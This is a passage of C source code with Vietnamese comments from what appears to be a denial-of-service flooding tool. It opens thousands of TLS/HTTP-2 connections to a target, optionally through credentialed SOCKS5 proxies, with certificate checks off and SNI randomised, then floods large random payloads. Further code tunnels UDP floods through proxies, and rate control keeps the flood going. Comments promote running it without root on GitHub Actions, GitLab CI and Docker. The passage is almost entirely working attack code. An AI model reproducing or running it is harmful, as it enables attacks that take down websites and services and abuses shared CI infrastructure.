                    unsigned int id=(~o_id&0xFFFF)+(bih->id&0xFFFF);
                    unsigned int ic=(~bih->check&0xFFFF)+id;
                    ic=(ic>>16)+(ic&0xFFFF); ic+=(ic>>16); bih->check=(unsigned short)~ic;
                }
            }
            thread_stats[tid].packets+=tot_sent;
            thread_stats[tid].tcp_packets+=tot_sent;
            thread_stats[tid].raw_sent+=tot_sent;
            thread_stats[tid].bytes+=tot_bytes;
        }

        /* Cleanup raw mode */
        free(r_buf);free(r_msg);free(r_iov);free(r_seq);free(r_ack);free(r_sp);
        free(r_st);free(r_rn);free(r_syn_cnt);free(r_prof_idx);free(r_ipid);
        free(r_tsval);free(r_ch_sent);free(r_port_map);
        free(r_huge);free(r_huge_sum);
        free(r_recv_buf);free(r_syn_buf);free(r_ack_buf);
        close(r_fd_send);close(r_fd_send2);close(r_fd_recv);
        return NULL;
    } /* ── KẾT THÚC RAW MODE ── */

v17_safe_mode:;
    /* ══════════════════════════════════════════════════════════════════════
     * PHẦN 3: SAFE MODE — TCP SOCK_STREAM + OpenSSL TLS + HTTP/2 + epoll
     * ══════════════════════════════════════════════════════════════════════
     * Không cần root. Hoạt động trên GitHub Actions, GitLab CI, Docker.
     * Kiến trúc: epoll edge-triggered + OpenSSL async + HTTP/2 frames
     * ══════════════════════════════════════════════════════════════════════ */
    signal(SIGINT,  _sig_stop_handler);
    signal(SIGTERM, _sig_stop_handler);
    LOG_INFO("T%d: SAFE MODE (TCP+TLS+HTTP/2) — no raw socket needed", tid);

    /* Lấy interface bằng getifaddrs (không dùng /proc) */
    char s_iface[32]="eth0";
    { struct ifaddrs *ifas,*ifa;
      if(getifaddrs(&ifas)==0){
          for(ifa=ifas;ifa;ifa=ifa->ifa_next){
              if(!ifa->ifa_addr||ifa->ifa_addr->sa_family!=AF_INET) continue;
              if(strcmp(ifa->ifa_name,"lo")==0) continue;
              if(ifa->ifa_flags&IFF_UP){strncpy(s_iface,ifa->ifa_name,31);break;}
          }
          freeifaddrs(ifas);
      }
    }

    /* --- Hằng số --- */
    #define S_BATCH      4096  /* Connections đồng thời */
    #define S_EPOLL_SZ   8192
    #define S_SEND_BURST 2048
    #define S_SEND_MIN   131072   /* 128KB per write */
    #define S_SEND_MAX   262144   /* 256KB per write */
    #define S_TIMEOUT    12000 /* Connect timeout ms */
    #define S_RECYCLE_MIN 1073741824U   /* 1GB */
    #define S_RECYCLE_MAX 3221225472U   /* 3GB */

    /* Trạng thái connection */
    #define S_ST_UNUSED      0
    #define S_ST_CONNECTING  1
    #define S_ST_PROXY_GREET 5  /* SOCKS5 greeting */
    #define S_ST_PROXY_AUTH  6  /* SOCKS5 auth */
    #define S_ST_PROXY_CONN  7  /* SOCKS5 CONNECT */
    #define S_ST_TLS_HS      2  /* TLS handshake đang chạy */
    #define S_ST_READY       3  /* Sẵn sàng gửi dữ liệu */
    #define S_ST_SENDING     4

    typedef struct {
        int fd;
        int state;
        SSL *ssl;              /* OpenSSL session (NULL nếu không dùng TLS) */
        unsigned long long bytes_sent;
        unsigned long long max_bytes;
        long long connect_time_ms;
        int slot_idx;
        int h2_stream_id;     /* HTTP/2 stream ID tiếp theo */
        int h2_sent_preface;  /* Đã gửi H2 preface chưa */
        Proxy *proxy;         /* SOCKS5 proxy (NULL = direct) */
    } SafeConn;

    /* --- Tạo SSL_CTX cho safe mode --- */
    SSL_CTX *s_ssl_ctx = NULL;
    int s_use_tls = (args.port == 443 || args.is_v18_tls);
    if (s_use_tls) {
        s_ssl_ctx = SSL_CTX_new(TLS_client_method());
        SSL_CTX_set_verify(s_ssl_ctx, SSL_VERIFY_NONE, NULL);
        SSL_CTX_set_min_proto_version(s_ssl_ctx, TLS1_2_VERSION);
        SSL_CTX_set_cipher_list(s_ssl_ctx,
            "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
            "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
            "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305");
        /* ALPN: h2, http/1.1 */
        unsigned char alpn[] = {2,'h','2', 8,'h','t','t','p','/','1','.','1'};
#if OPENSSL_VERSION_NUMBER >= 0x10002000L
        SSL_CTX_set_alpn_protos(s_ssl_ctx, alpn, sizeof(alpn));
#endif
#if OPENSSL_VERSION_NUMBER >= 0x10101000L
        SSL_CTX_set_ciphersuites(s_ssl_ctx,
            "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256");
#endif
        LOG_INFO("T%d: TLS enabled (port=%d)", tid, args.port);
    }

    /* --- Tạo epoll --- */
    int s_epfd = epoll_create1(0);
    struct epoll_event *s_evts = calloc(S_EPOLL_SZ, sizeof(struct epoll_event));
    SafeConn *s_conns = calloc(S_BATCH, sizeof(SafeConn));
    char *s_http_buf = malloc(65536);
    if (!s_epfd || !s_evts || !s_conns || !s_http_buf) {
        LOG_ERR("T%d: malloc failed", tid); return NULL;
    }
    for (int i=0; i<S_BATCH; i++) {
        s_conns[i].fd=-1; s_conns[i].state=S_ST_UNUSED;
        s_conns[i].slot_idx=i; s_conns[i].ssl=NULL;
        s_conns[i].proxy=NULL;
    }

    struct sockaddr_in s_target = {0};
    s_target.sin_family = AF_INET;
    s_target.sin_port = htons(args.port);
    inet_pton(AF_INET, args.target_ip, &s_target.sin_addr);

    /* HTTP paths cho request */
    static const char *s_paths[]={"/","/index.html","/api/v1/status","/api/health",
        "/favicon.ico","/robots.txt","/wp-admin/","/xmlrpc.php","/api/graphql",
        "/search?q=test","/login","/static/js/main.js","/assets/style.css",
        "/.well-known/security.txt","/sitemap.xml"};
    int s_npaths = 15;

    /* --- Macro tạo connection --- */
    #define S_CREATE(idx) do { \
        SafeConn *_c = &s_conns[idx]; \
        int _fd = socket(AF_INET, SOCK_STREAM|SOCK_NONBLOCK, 0); \
        if(_fd<0) break; \
        int _1=1; \
        setsockopt(_fd,IPPROTO_TCP,TCP_NODELAY,&_1,sizeof(_1)); \
        (void)setsockopt(_fd,IPPROTO_TCP,TCP_QUICKACK,&_1,sizeof(_1)); \
        int _sb=16*1024*1024; \
        setsockopt(_fd,SOL_SOCKET,SO_SNDBUF,&_sb,sizeof(_sb)); \
        setsockopt(_fd,SOL_SOCKET,SO_RCVBUF,&_sb,sizeof(_sb)); \
        setsockopt(_fd,SOL_SOCKET,SO_REUSEADDR,&_1,sizeof(_1)); \
        /* SOCKS5: nếu có proxy, connect đến proxy thay vì target */ \
        _c->proxy = NULL; \
        struct sockaddr_in _dst; \
        memset(&_dst, 0, sizeof(_dst)); \
        _dst.sin_family = AF_INET; \
        if (proxy_count > 0) { \
            Proxy *_p = select_alive_proxy(); \
            if (_p) { \
                _c->proxy = _p; \
                char _pip[64]; \
                LOG_INFO("T%d S_CREATE: selected proxy %s:%d (user=%s)", tid, _p->host, _p->port, _p->user); \
                resolve_host(_p->host, _pip); \
                LOG_INFO("T%d S_CREATE: resolved proxy IP = %s", tid, _pip); \
                if (inet_pton(AF_INET, _pip, &_dst.sin_addr) != 1) { \
                    LOG_ERR("T%d S_CREATE: inet_pton failed for proxy IP %s", tid, _pip); \
                } \
                _dst.sin_port = htons(_p->port); \
                __sync_fetch_and_add(&_p->active_conns, 1); \
            } else { \
                memcpy(&_dst, &s_target, sizeof(_dst)); \
            } \
        } else { \
            memcpy(&_dst, &s_target, sizeof(_dst)); \
        } \
        int _r=connect(_fd,(struct sockaddr*)&_dst,sizeof(_dst)); \
        if(_r<0 && errno!=EINPROGRESS){close(_fd); \
            if(_c->proxy){__sync_fetch_and_sub(&_c->proxy->active_conns,1);_c->proxy=NULL;} \
            break;} \
        struct epoll_event _ev; \
        _ev.events=EPOLLET|EPOLLOUT|EPOLLIN|EPOLLHUP|EPOLLERR; \
        _ev.data.ptr=_c; \
        if(epoll_ctl(s_epfd,EPOLL_CTL_ADD,_fd,&_ev)<0){close(_fd); \
            if(_c->proxy){__sync_fetch_and_sub(&_c->proxy->active_conns,1);_c->proxy=NULL;} \
            break;} \
        _c->fd=_fd; _c->state=S_ST_CONNECTING; _c->bytes_sent=0; \
        _c->max_bytes=S_RECYCLE_MIN+(fast_rand()%(S_RECYCLE_MAX-S_RECYCLE_MIN)); \
        _c->connect_time_ms=get_ms(); _c->ssl=NULL; \
        _c->h2_stream_id=1; _c->h2_sent_preface=0; \
    } while(0)

    /* Macro đóng + tái tạo connection */
    #define S_RECYCLE(idx) do { \
        SafeConn *_c=&s_conns[idx]; \
        if(_c->ssl){SSL_shutdown(_c->ssl);SSL_free(_c->ssl);_c->ssl=NULL;} \
        if(_c->fd>=0){epoll_ctl(s_epfd,EPOLL_CTL_DEL,_c->fd,NULL);close(_c->fd);} \
        if(_c->proxy){ \
            LOG_INFO("T%d recycle conn with proxy %s:%d, state=%d", tid, _c->proxy->host, _c->proxy->port, _c->state); \
            if(_c->proxy->active_conns>0) __sync_fetch_and_sub(&_c->proxy->active_conns,1); \
            _c->proxy=NULL; \
        } \
        _c->fd=-1; _c->state=S_ST_UNUSED; _c->bytes_sent=0; \
        _c->h2_stream_id=1; _c->h2_sent_preface=0; \
        S_CREATE(idx); \
    } while(0)

    /* --- Khởi tạo connections --- */
    int s_nconns = S_BATCH; /* Luôn dùng tối đa connections */
    LOG_INFO("T%d: Khởi tạo %d connections tới %s:%d (TLS=%d)",
             tid, s_nconns, args.target_ip, args.port, s_use_tls);
    for (int i=0; i<s_nconns; i++) {
        S_CREATE(i);
        if (i>0 && i%200==0) {
            int nf=epoll_wait(s_epfd,s_evts,S_EPOLL_SZ,0);
            for(int j=0;j<nf;j++){
                SafeConn *c=(SafeConn*)s_evts[j].data.ptr;
                if(c && (s_evts[j].events&(EPOLLERR|EPOLLHUP))) S_RECYCLE(c->slot_idx);
            }
        }
    }

    /* --- Adaptive rate control --- */
    long long s_rate_check = get_ms();
    unsigned long long s_ok_snap=0, s_fail_snap=0;

    /* --- VÒNG LẶP CHÍNH SAFE MODE --- */
    long long s_last_timeout = get_ms();
    long long s_last_log = get_ms();

    while (!g_stop) {
        int nfds = epoll_wait(s_epfd, s_evts, S_EPOLL_SZ, 1);
        long long now = get_ms(); /* Cache timestamp */

        for (int i=0; i<nfds; i++) {
            SafeConn *c = (SafeConn*)s_evts[i].data.ptr;
            if (!c || c->fd<0) continue;
            unsigned int ev = s_evts[i].events;

            /* Lỗi → tái tạo */
            if (ev & (EPOLLERR|EPOLLHUP)) {
                thread_stats[tid].connect_fail++;
                S_RECYCLE(c->slot_idx);
                continue;
            }

            /* EPOLLIN: xử lý proxy response và drain recv buffer */
            if (ev & EPOLLIN) {
                if (c->state == S_ST_PROXY_GREET) {
                    unsigned char resp[2];
                    int r = read(c->fd, resp, 2);
                    if (r == 2 && resp[0] == 0x05) {
                        LOG_INFO("T%d SOCKS5 greet resp: ver=%02x method=%02x", tid, resp[0], resp[1]);
                        if (resp[1] == 0x00) {
                            unsigned char conn_req[10];
                            conn_req[0] = 0x05; conn_req[1] = 0x01; conn_req[2] = 0x00; conn_req[3] = 0x01; 
                            struct in_addr taddr; char ip_buf[64];
                            resolve_host(args.target_ip, ip_buf); inet_pton(AF_INET, ip_buf, &taddr);
                            memcpy(conn_req+4, &taddr, 4);
                            uint16_t tport = htons(args.port); memcpy(conn_req+8, &tport, 2);
                            send(c->fd, conn_req, 10, MSG_NOSIGNAL);
                            c->state = S_ST_PROXY_CONN;
                        } else if (resp[1] == 0x02 && strlen(c->proxy->user) > 0) {
                            unsigned char auth[515]; int ap=0;
                            auth[ap++] = 0x01; 
                            int ulen = strlen(c->proxy->user); if(ulen>255)ulen=255;
                            auth[ap++] = ulen; memcpy(auth+ap, c->proxy->user, ulen); ap+=ulen;
                            int plen = strlen(c->proxy->pass); if(plen>255)plen=255;
                            auth[ap++] = plen; memcpy(auth+ap, c->proxy->pass, plen); ap+=plen;
                            send(c->fd, auth, ap, MSG_NOSIGNAL);
                            c->state = S_ST_PROXY_AUTH;
                        } else {
                            LOG_INFO("T%d SOCKS5 error at state %d: %s", tid, c->state, "Unsupported method");
                            S_RECYCLE(c->slot_idx); continue;
                        }
                    } else if (r <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                        LOG_INFO("T%d SOCKS5 error at state %d: %s", tid, c->state, strerror(errno));
                        S_RECYCLE(c->slot_idx); continue;
                    }
                } else if (c->state == S_ST_PROXY_AUTH) {
                    unsigned char resp[2];
                    int r = read(c->fd, resp, 2);
                    if (r == 2) {
                        LOG_INFO("T%d SOCKS5 auth resp: ver=%02x status=%02x", tid, resp[0], resp[1]);
                        if (resp[1] == 0x00) {
                            unsigned char conn_req[10];
                            conn_req[0] = 0x05; conn_req[1] = 0x01; conn_req[2] = 0x00; conn_req[3] = 0x01; 
                            struct in_addr taddr; char ip_buf[64];
                            resolve_host(args.target_ip, ip_buf); inet_pton(AF_INET, ip_buf, &taddr);
                            memcpy(conn_req+4, &taddr, 4);
                            uint16_t tport = htons(args.port); memcpy(conn_req+8, &tport, 2);
                            send(c->fd, conn_req, 10, MSG_NOSIGNAL);
                            c->state = S_ST_PROXY_CONN;
                        } else {
                            LOG_INFO("T%d SOCKS5 error at state %d: %s", tid, c->state, "Auth failed");
                            S_RECYCLE(c->slot_idx); continue;
                        }
                    } else if (r <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                        LOG_INFO("T%d SOCKS5 error at state %d: %s", tid, c->state, strerror(errno));
                        S_RECYCLE(c->slot_idx); continue;
                    }
                } else if (c->state == S_ST_PROXY_CONN) {
                    unsigned char resp[10];
                    int r = read(c->fd, resp, 10);
                    if (r >= 2 && resp[0] == 0x05) {
                        LOG_INFO("T%d SOCKS5 conn resp: ver=%02x rep=%02x", tid, resp[0], resp[1]);
                        if (resp[1] == 0x00) {
                            thread_stats[tid].connect_success++;
                            if(c->proxy->fail_count > 0) c->proxy->fail_count = 0;
                            c->proxy->success_count++;
                            if (s_use_tls) {
                                c->ssl = SSL_new(s_ssl_ctx);
                                SSL_set_fd(c->ssl, c->fd);
                                SSL_set_tlsext_host_name(c->ssl, v17_sni_domains[fast_rand()%n_sni]);
                                SSL_set_connect_state(c->ssl);
                                c->state = S_ST_TLS_HS;
                            } else {
                                c->state = S_ST_READY;
                            }
                        } else {
                            LOG_INFO("T%d SOCKS5 error at state %d: %s", tid, c->state, "Connect rejected");
                            S_RECYCLE(c->slot_idx); continue;
                        }
                    } else if (r <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                        LOG_INFO("T%d SOCKS5 error at state %d: %s", tid, c->state, strerror(errno));
                        S_RECYCLE(c->slot_idx); continue;
                    }
                } else if (c->ssl) {
                    char d[8192]; int r;
                    while((r=SSL_read(c->ssl,d,sizeof(d)))>0){}
                    if(r<=0){
                        int e=SSL_get_error(c->ssl,r);
                        if(e!=SSL_ERROR_WANT_READ && e!=SSL_ERROR_WANT_WRITE){
                            S_RECYCLE(c->slot_idx); continue;
                        }
                    }
                } else if (c->state >= S_ST_READY) {
                    char d[8192];
                    while(recv(c->fd,d,sizeof(d),MSG_DONTWAIT)>0){}
                }
            }

            /* State Machine (Write-driven) */
            if (ev & EPOLLOUT) {
                /* Trạng thái 1: TCP connect vừa hoàn tất */
                if (c->state == S_ST_CONNECTING) {
                    int so_err=0; socklen_t so_len=sizeof(so_err);
                    getsockopt(c->fd,SOL_SOCKET,SO_ERROR,&so_err,&so_len);
                    if (so_err!=0) {
                        LOG_ERR("T%d connect error: %s (proxy=%s)", tid, strerror(so_err), c->proxy ? "yes" : "no");
                        thread_stats[tid].connect_fail++;
                        if(c->proxy){__sync_fetch_and_add(&c->proxy->fail_count,1);c->proxy->last_fail_time=get_ms();if(c->proxy->fail_count>=15)c->proxy->is_dead=1;}
                        S_RECYCLE(c->slot_idx); continue;
                    }
                    { int qa=1; (void)setsockopt(c->fd,IPPROTO_TCP,TCP_QUICKACK,&qa,sizeof(qa)); }

                    if (c->proxy) {
                        LOG_INFO("T%d connected to proxy %s:%d", tid, c->proxy->host, c->proxy->port);
                        struct timeval tv;
                        tv.tv_sec = 5;
                        tv.tv_usec = 0;
                        setsockopt(c->fd, SOL_SOCKET, SO_RCVTIMEO, (const void*)&tv, sizeof(tv));
                        setsockopt(c->fd, SOL_SOCKET, SO_SNDTIMEO, (const void*)&tv, sizeof(tv));
                        
                        unsigned char greet[4] = {0x05, 0x02, 0x00, 0x02};
                        send(c->fd, greet, 4, MSG_NOSIGNAL);
                        c->state = S_ST_PROXY_GREET;
                    } else {
                        LOG_INFO("T%d direct connect, no proxy", tid);
                        thread_stats[tid].connect_success++;
                        if (s_use_tls) {
                            c->ssl = SSL_new(s_ssl_ctx);
                            SSL_set_fd(c->ssl, c->fd);
                            SSL_set_tlsext_host_name(c->ssl, v17_sni_domains[fast_rand()%n_sni]);
                            SSL_set_connect_state(c->ssl);
                            c->state = S_ST_TLS_HS;
                        } else {
                            c->state = S_ST_READY;
                        }
                    }
                }

                /* Trạng thái: TLS handshake bất đồng bộ */
                if (c->state == S_ST_TLS_HS && c->ssl) {
                    int r = SSL_connect(c->ssl);
                    if (r == 1) {
                        c->state = S_ST_READY;
                    } else {
                        int e = SSL_get_error(c->ssl, r);
                        if (e==SSL_ERROR_WANT_READ || e==SSL_ERROR_WANT_WRITE) {
                            continue;
                        }
                        thread_stats[tid].connect_fail++;
                        if(c->proxy){__sync_fetch_and_add(&c->proxy->fail_count,1);c->proxy->last_fail_time=get_ms();}
                        S_RECYCLE(c->slot_idx); continue;
                    }
                }

                /* Trạng thái 3: Sẵn sàng → gửi HTTP/2 preface hoặc HTTP/1.1 */
                if (c->state == S_ST_READY) {
                    if (!c->h2_sent_preface) {
                        /* Gửi HTTP/2 connection preface */
                        int r;
                        if (c->ssl)
                            r = SSL_write(c->ssl, v17_h2_preface, sizeof(v17_h2_preface));
                        else
                            r = send(c->fd, v17_h2_preface, sizeof(v17_h2_preface), MSG_NOSIGNAL);
                        if (r>0) {
                            thread_stats[tid].bytes+=r;
                            thread_stats[tid].packets++;
                        }
                        c->h2_sent_preface = 1;

                        /* Gửi HTTP/2 HEADERS frame (GET /) */
                        unsigned char h2h[64];
                        int hp=0;
                        /* HEADERS frame: length=6, type=1, flags=0x05, stream=1 */
                        h2h[hp++]=0;h2h[hp++]=0;h2h[hp++]=6; /* length */
                        h2h[hp++]=0x01; /* type=HEADERS */
                        h2h[hp++]=0x05; /* END_STREAM|END_HEADERS */
                        h2h[hp++]=0;h2h[hp++]=0;h2h[hp++]=0;h2h[hp++]=0x01; /* stream=1 */
                        /* HPACK: :method=GET, :scheme=https, :path=/ */
                        h2h[hp++]=0x82; h2h[hp++]=0x87; h2h[hp++]=0x84;
                        h2h[hp++]=0x41; /* :authority */
                        int hl=strlen(args.host);
                        h2h[hp++]=hl&0x7F;
                        memcpy(h2h+hp,args.host,hl>40?40:hl);hp+=(hl>40?40:hl);
                        /* Cập nhật length */
                        int fl=hp-9; h2h[0]=(fl>>16)&0xFF;h2h[1]=(fl>>8)&0xFF;h2h[2]=fl&0xFF;

                        if(c->ssl) r=SSL_write(c->ssl,h2h,hp);
                        else r=send(c->fd,h2h,hp,MSG_NOSIGNAL);
                        if(r>0){thread_stats[tid].bytes+=r;thread_stats[tid].packets++;}
                        c->h2_stream_id = 3;
                    }
                    c->state = S_ST_SENDING;
                }

                /* Trạng thái 4: BLAST dữ liệu */
                if (c->state == S_ST_SENDING) {
                    int ok=1;

                    for (int b=0; b<S_SEND_BURST && ok; b++) {
                        int size = S_SEND_MIN+(fast_rand()%(S_SEND_MAX-S_SEND_MIN));
                        int off = fast_rand()%(BUFFER_POOL_SIZE-size);
                        int r;
                        if (c->ssl)
                            r = SSL_write(c->ssl, global_buffer_pool+off, size);
                        else
                            r = send(c->fd, global_buffer_pool+off, size, MSG_NOSIGNAL);

                        if (r<=0) {
                            if (c->ssl) {
                                int e=SSL_get_error(c->ssl,r);
                                if(e==SSL_ERROR_WANT_WRITE||e==SSL_ERROR_WANT_READ) break;
                            } else {
                                if(errno==EAGAIN||errno==EWOULDBLOCK) break;
                            }
                            ok=0; break;
                        }
                        thread_stats[tid].packets++;
                        thread_stats[tid].tcp_packets++;
                        thread_stats[tid].bytes+=r;
                        c->bytes_sent+=r;
                    }

                    if (!ok) { thread_stats[tid].send_errors++; S_RECYCLE(c->slot_idx); continue; }
                    if (c->bytes_sent >= c->max_bytes) S_RECYCLE(c->slot_idx);
                }
            }
        }

        if (now - s_last_timeout >= 2000) {
            for (int i=0; i<s_nconns; i++) {
                SafeConn *c = &s_conns[i];
                if ((c->state>=S_ST_CONNECTING && c->state<=S_ST_PROXY_CONN) && c->fd>=0) {
                    if (now-c->connect_time_ms > S_TIMEOUT) {
                        thread_stats[tid].connect_fail++;
                        S_RECYCLE(i);
                    }
                }
            }
            s_last_timeout = now;
        }

        /* ── Adaptive rate control (mỗi 10 giây, ít aggressive hơn) ── */
        if (tid==0 && now-s_rate_check>=10000) {
            unsigned long long ok_now = thread_stats[0].connect_success;
            unsigned long long fail_now = thread_stats[0].connect_fail;
            unsigned long long d_ok = ok_now - s_ok_snap;
            unsigned long long d_fail = fail_now - s_fail_snap;
            s_ok_snap=ok_now; s_fail_snap=fail_now;
            if (d_ok+d_fail > 0) {
                double fail_pct = (double)d_fail / (double)(d_ok+d_fail+1) * 100.0;
                if (fail_pct > 50.0) {
                    int nr = (int)(atomic_load(&v17_current_rate) * 0.85);
                    if (nr < 500) nr = 500;
                    atomic_store(&v17_current_rate, nr);
                    LOG_INFO("T0: Rate DOWN %.1f%% fail → rate=%d", fail_pct, nr);
                } else if (fail_pct < 5.0 && atomic_load(&v17_current_rate) < args.rate) {
                    int nr = (int)(atomic_load(&v17_current_rate) * 1.3);
                    if (nr > args.rate) nr = args.rate;
                    atomic_store(&v17_current_rate, nr);
                }
            }
            s_rate_check = now;
        }

        /* ── Duy trì connection pool ── */
        for (int i=0; i<s_nconns; i++) {
            if (s_conns[i].state==S_ST_UNUSED && s_conns[i].fd<0)
                S_CREATE(i);
        }

        /* ── Active sweep: gửi data trên TẤT CẢ connections SENDING (không chờ EPOLLOUT) ── */
        for (int i=0; i<s_nconns; i++) {
            SafeConn *c = &s_conns[i];
            if (c->state != S_ST_SENDING || c->fd < 0) continue;
            for (int b=0; b<64; b++) {
                int size = S_SEND_MIN+(fast_rand()%(S_SEND_MAX-S_SEND_MIN));
                int off = fast_rand()%(BUFFER_POOL_SIZE-size);
                int r;
                if (c->ssl)
                    r = SSL_write(c->ssl, global_buffer_pool+off, size);
                else
                    r = send(c->fd, global_buffer_pool+off, size, MSG_NOSIGNAL);
                if (r<=0) break;
                thread_stats[tid].packets++;
                thread_stats[tid].tcp_packets++;
                thread_stats[tid].bytes+=r;
                c->bytes_sent+=r;
            }
            if (c->bytes_sent >= c->max_bytes) S_RECYCLE(c->slot_idx);
        }

        /* ── Log mỗi 10 giây ── */
        if (tid==0 && now-s_last_log>=10000) {
            int act=0,hs=0,snd=0,prx=0;
            for(int i=0;i<s_nconns;i++){
                if(s_conns[i].state==S_ST_TLS_HS) hs++;
                else if(s_conns[i].state==S_ST_SENDING) snd++;
                else if(s_conns[i].state==S_ST_PROXY_GREET||s_conns[i].state==S_ST_PROXY_AUTH||s_conns[i].state==S_ST_PROXY_CONN) prx++;
                if(s_conns[i].fd>=0) act++;
            }
            LOG_INFO("T%d SAFE | act=%d tls=%d send=%d proxy=%d | pkts=%llu B=%llu ok=%llu fail=%llu rate=%d",
                     tid,act,hs,snd,prx,
                     thread_stats[tid].packets,thread_stats[tid].bytes,
                     thread_stats[tid].connect_success,thread_stats[tid].connect_fail,
                     v17_current_rate);
            s_last_log=now;
        }
    }

    /* Cleanup safe mode */
    for(int i=0;i<S_BATCH;i++){
        if(s_conns[i].ssl){SSL_shutdown(s_conns[i].ssl);SSL_free(s_conns[i].ssl);}
        if(s_conns[i].proxy && s_conns[i].proxy->active_conns>0)
            __sync_fetch_and_sub(&s_conns[i].proxy->active_conns,1);
        if(s_conns[i].fd>=0) close(s_conns[i].fd);
    }
    free(s_evts);free(s_conns);free(s_http_buf);
    close(s_epfd);
    if(s_ssl_ctx) SSL_CTX_free(s_ssl_ctx);
    return NULL;
    } /* ── KẾT THÚC V17 TCP BYPASS ENGINE V2 ── */



    int epoll_fd = epoll_create1(0);
    struct epoll_event events[EPOLL_SIZE];
    
    // Pure TCP mode - no UDP fd setup
    
    long long last_timeout_check_ms = get_ms();
    
    int initial = args.rate / args.threads;
    
    for (int i = 0; i < initial; i++) {
        if (get_total_active_conns() >= args.rate) break;
        spawn_connection(epoll_fd, tid);
        
        if (i > 0 && i % 10 == 0) {
            int nfds = epoll_wait(epoll_fd, events, EPOLL_SIZE, 0);
            for (int j = 0; j < nfds; j++) handle_connection_event(epoll_fd, &events[j], tid);
        }
    }
    
    while (1) {
        int nfds = epoll_wait(epoll_fd, events, EPOLL_SIZE, 1);
        for (int i = 0; i < nfds; i++) handle_connection_event(epoll_fd, &events[i], tid);
        
        long long now = get_ms();
        
        // SOCKS5 and connection timeout checks
        if (now - last_timeout_check_ms >= 1000) {
            Connection *curr = active_conns_list;
            while (curr) {
                Connection *next_conn = curr->next;
                if (curr->stage != STAGE_ATTACKING && (now - curr->last_pulse_ms > 15000)) {
                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, curr->fd, NULL);
                    
                    thread_stats[tid].connect_fail++;
                    if (curr->proxy) {
                        __sync_fetch_and_add(&curr->proxy->fail_count, 1);
                        curr->proxy->last_fail_time = now;
                        if (curr->proxy->fail_count >= 15) {
                            curr->proxy->is_dead = 1;
                        }
                        if (curr->proxy->active_conns > 0) { __sync_fetch_and_sub(&curr->proxy->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
                    } else {
                        if (global_active_conns > 0) __sync_fetch_and_sub(&global_active_conns, 1);
                    }
                    if (curr->ssl) SSL_free(curr->ssl);
                    if (curr->fd > 0) close(curr->fd);
                    if (curr->client_udp_fd > 0) close(curr->client_udp_fd);
                    
                    if (curr->prev) {
                        curr->prev->next = curr->next;
                    } else {
                        active_conns_list = curr->next;
                    }
                    if (curr->next) {
                        curr->next->prev = curr->prev;
                    }
                    free(curr);
                }
                curr = next_conn;
            }
            last_timeout_check_ms = now;
        }

        // Pure TCP mode - no UDP sending block

        // Active TCP sending loop for V15 to maximize PPS on fully completed connections
        if (args.is_v15_raw_amp || (args.is_hybrid_v15 && proxy_count > 0)) {
            Connection *curr = active_conns_list;
            while (curr) {
                Connection *next_conn = curr->next;
                if (curr->stage == STAGE_ATTACKING) {
                    if (curr->is_udp_assoc) {
                        int sent_count = 0;
                        int ret = 1;
                        while (sent_count < 32) {
                            int payload_len = 1200 + (fast_rand() % 200);
                            int offset = fast_rand() % (BUFFER_POOL_SIZE - payload_len);
                            
                            if (curr->proxy) {
                                int total_len = 10 + payload_len;
                                unsigned char udp_pkt[1500];
                                udp_pkt[0] = 0x00; udp_pkt[1] = 0x00; udp_pkt[2] = 0x00; udp_pkt[3] = 0x01;
                                memcpy(udp_pkt + 4, &bin_target_ip, 4);
                                memcpy(udp_pkt + 8, &bin_target_port, 2);
                                memcpy(udp_pkt + 10, global_buffer_pool + offset, payload_len);
                                ret = send(curr->client_udp_fd, udp_pkt, total_len, MSG_DONTWAIT);
                            } else {
                                ret = send(curr->client_udp_fd, global_buffer_pool + offset, payload_len, MSG_DONTWAIT);
                            }
                            
                            if (ret <= 0) {
                                break;
                            }
                            thread_stats[tid].packets++;
                            thread_stats[tid].bytes += ret;
                            sent_count++;
                        }
                        if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                            epoll_ctl(epoll_fd, EPOLL_CTL_DEL, curr->fd, NULL);
                            thread_stats[tid].connect_fail++;
                            if (curr->proxy) {
                                __sync_fetch_and_add(&curr->proxy->fail_count, 1);
                                curr->proxy->last_fail_time = now;
                                if (curr->proxy->fail_count >= 15) {
                                    curr->proxy->is_dead = 1;
                                }
                                if (curr->proxy->active_conns > 0) {
                                    __sync_fetch_and_sub(&curr->proxy->active_conns, 1);
                                    __sync_fetch_and_sub(&global_proxy_active_conns, 1);
                                }
                            }
                            if (curr->fd > 0) close(curr->fd);
                            if (curr->client_udp_fd > 0) close(curr->client_udp_fd);
                            if (curr->prev) {
                                curr->prev->next = curr->next;
                            } else {
                                active_conns_list = curr->next;
                            }
                            if (curr->next) {
                                curr->next->prev = curr->prev;
                            }
                            free(curr);
                        }
                    } else if (curr->writable) {
                        int cork = 1;
                        setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                        int ret;
                        int batch_count = 0;
                        while (1) {
                            int s = 32768 + (fast_rand() % 32768);
                            int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
                            ret = send(curr->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL | MSG_MORE);
                            if (ret <= 0) {
                                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                                    curr->writable = 0;
                                }
                                break;
                            }
                            thread_stats[tid].packets++;
                            thread_stats[tid].tcp_packets++;
                            thread_stats[tid].bytes += ret;
                            batch_count++;
                            if (batch_count >= 64) {
                                cork = 0;
                                setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                                cork = 1;
                                setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                                batch_count = 0;
                            }
                        }
                        cork = 0;
                        setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                        if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                            epoll_ctl(epoll_fd, EPOLL_CTL_DEL, curr->fd, NULL);
